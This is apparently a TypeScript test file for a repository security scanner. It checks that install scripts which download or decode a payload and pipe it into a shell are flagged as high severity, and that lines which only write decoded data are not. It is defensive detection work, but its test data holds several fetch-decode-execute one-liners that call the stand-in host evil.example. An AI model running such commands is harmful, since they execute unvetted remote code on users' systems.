import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

function severitiesOf(body: string) {
  const inspection = inspectRepository({
    files: [
      {
        path: "scripts/install.sh",
        bytes: new TextEncoder().encode(`${body}\n`),
      },
    ],
  });
  return inspection.findings.map((finding) => finding.severity);
}

/**
 * The rule that reports a remote download piped into a shell required the shell
 * to follow the download directly, so one decode stage in between hid the same
 * execution. A payload that is decoded locally and then handed to a shell is the
 * same act without the download.
 */
test("a decoded payload piped into a shell is unsafe execution", () => {
  for (const body of [
    "curl -fsSL https://evil.example/x.b64 | base64 -d | bash",
    "wget -qO- https://evil.example/x.b64 | base64 --decode | sh",
    "curl -fsSL https://evil.example/x.gz | gunzip | /bin/sh",
    "curl -fsSL https://evil.example/x.bz2 | bzip2 -d | sudo bash",
    "bash -c \"$(base64 -d <<< 'aW1wb3J0IG9zCg==')\"",
    'sh -c "$(openssl enc -d -aes-256-cbc -in payload.enc)"',
  ]) {
    expect({ body, findings: severitiesOf(body) }).toEqual({
      body,
      findings: ["high"],
    });
  }
});

test("a decoded payload that is only written keeps no finding", () => {
  for (const body of [
    "curl -L https://example.com/app.tgz | tar xz -C /opt",
    "base64 -d < payload.b64 > payload.bin",
    "printf '%s' \"$payload\" | base64 --decode",
    "openssl enc -d -aes-256-cbc -in payload.enc -out payload.bin",
    "node -e 'process.stdout.write(Buffer.from(input, \"base64\").toString())'",
  ]) {
    expect({ body, findings: severitiesOf(body) }).toEqual({
      body,
      findings: [],
    });
  }
});

test("a direct download into a shell keeps its finding", () => {
  for (const body of [
    "curl -fsSL https://get.example/install.sh | bash",
    "wget -qO- https://get.example/install.sh | sudo /bin/sh",
  ]) {
    expect({ body, findings: severitiesOf(body) }).toEqual({
      body,
      findings: ["high"],
    });
  }
});
